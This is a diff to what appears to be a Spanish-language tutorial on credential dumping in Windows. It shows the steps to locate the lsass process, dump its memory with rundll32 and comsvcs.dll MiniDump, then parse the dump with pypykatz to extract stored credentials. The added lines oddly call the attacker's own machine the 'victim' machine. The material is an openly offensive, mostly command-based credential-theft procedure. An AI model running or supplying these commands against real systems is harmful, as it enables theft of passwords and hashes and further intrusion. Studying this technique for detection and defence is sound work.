@@ -7,4 +7,7 @@ SASS es un servicio crítico que desempeña un papel central en la gestión de c
 Get-Process lsass (obtener el PID del proceso lsass)
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
-
+Lo siguiente es pasar ese archivo a tu equipo victima, y luego podemos romperlo o ver lo oculto con pypykatz
+```python
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+```
